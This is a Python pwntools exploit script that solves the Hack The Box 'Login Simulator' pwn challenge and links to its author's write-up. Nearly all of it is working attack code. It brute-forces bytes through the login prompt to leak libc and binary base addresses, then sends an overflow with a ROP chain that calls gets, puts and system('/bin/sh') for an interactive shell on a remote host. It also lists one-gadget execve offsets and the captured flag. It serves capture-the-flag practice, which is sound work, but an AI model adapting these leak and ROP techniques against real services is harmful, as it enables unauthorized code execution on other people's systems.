#https://lexsd6.github.io/2022/04/03/HTB-Login%20Simulator-pwn-challenge-wp/#UAF

#!/usr/bin/env python
# -*- encoding: utf-8 -*-

'''
@File    :   exp.py
@Time    :   2021/12/14 09:59:41
@Author  :   lexsd6
'''


from pwn import *
#from libcfind import *

local_mote=0
elf='./loginsim'
e=ELF(elf)
#context.log_level = 'debug'
#context.arch=e.arch
ip_port=['165.227.232.214', 31650]

debug=lambda : gdb.attach(p) if local_mote==1 else None


def add(mun,text):
    p.sendline('1')
    #sleep(0.2)
    p.recvuntil('{i} Username length:')
    p.sendline(str(mun))
    p.recvuntil('{i} Enter username:')
    p.sendline(text)

def login(text):
    #sleep(0.2)
    p.sendline('2')
    p.recvuntil('{i} Username:')
    p.send(text)


def guess_libc(n):

    #debug()
    for i in range(0x100):
        #i=0xff-i
       # sleep(0.1)
        add(0x20+n,'w'*0x20+'w'*(n-1)+chr(i))
       # sleep(0.2)
        p.recvuntil('->')

       #print(i)
       # sleep(0.1)
        login('w'*(0x20+n-1)+'\n')
        line=p.recvline()[:-1]
                    #print(i)
        if line!=' Invalid username! :)':
                        print(hex(i))
                        return i

    return 0xa
def guess(n):
    #debug()
    for i in range(0x100):
        #i=0xff-i
       # sleep(0.1)
        add(0x20+n,'w'*0x20+'w'*(n-1)+chr(i))
       # sleep(0.2)
        p.recvuntil('->')

       #print(i)
       # sleep(0.1)
        login('w'*(0x20+n-1)+'\n')
        line=p.recvline()[:-1]
                    #print(i)
        if line!=' Invalid username! :)':
                        print(hex(i))
                        return i

    return 0xa

def link():
    x=0
    k=0x100
    for i in range(6):
        x=x+guess(i+1)*k
	#debug()
        k=k*0x100
        log.info(hex(x//0x100))
    print(hex(x//0x100))
    return x//0x100

def elf_link():
    x=0
    k=0x100
    for i in range(6):
        x=x+guess(i+1+8)*k
	#debug()
        k=k*0x100
        log.info(hex(x//0x100))
    print(hex(x//0x100))
    return x//0x100

"""
0xe6c7e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe6c81 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe6c84 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

"""
#while True:
#    try :
if local_mote==1 :
            p=process(elf)
else :
            p=remote(ip_port[0],ip_port[-1])
if True:
        stdout_addr=link()
        #x=finder('_IO_2_1_stdout_',stdout_addr,num=1)
        elf_base=elf_link()-0x25fe
        libc_base=stdout_addr-0x1ec6a0
        system_addr=0x000000000055410+libc_base
        gets_addr= 0x86af0+libc_base
        puts_addr=0x0000000000875a0+libc_base
        rsi_ret=0x0000000000027529+libc_base
        rdi_ret=0x0000000000026b72+libc_base

        bin_sh_addr=elf_base+0x4000+0x100
        ret=0x0000000000025679+libc_base
        log.info('bin_sh_addr:'+hex(bin_sh_addr))
        log.info('libc_base'+hex(libc_base))
        log.info('elf_base:'+hex(elf_base))
        #debug()
        p.recv(timeout=4)
        p.sendline('1')
        p.sendline(str(0x80))	#'z'*0x60+'j'*(0x100-0x20))
        p.recv()
        p.sendline('w'*(0x40)+chr(0x20)*0x78+p64((rdi_ret))+p64(bin_sh_addr)+p64(rsi_ret)+p64(0)+p64(ret)+p64(gets_addr)+p64((rdi_ret))+p64(bin_sh_addr)+p64(rsi_ret)+p64(0)+p64(ret)+p64(gets_addr)+p64((rdi_ret))+p64(bin_sh_addr)+p64(rsi_ret)+p64(0)+p64(ret)+p64(puts_addr)+p64((rdi_ret))+p64(bin_sh_addr)+p64(rsi_ret)+p64(0)+p64(ret)+p64(system_addr))
        sleep(0.5)
        p.sendline('/bin/sh\x00')
        p.interactive()

#HTB{bUff3R-uNd3rf1Ov_fTw?!??}
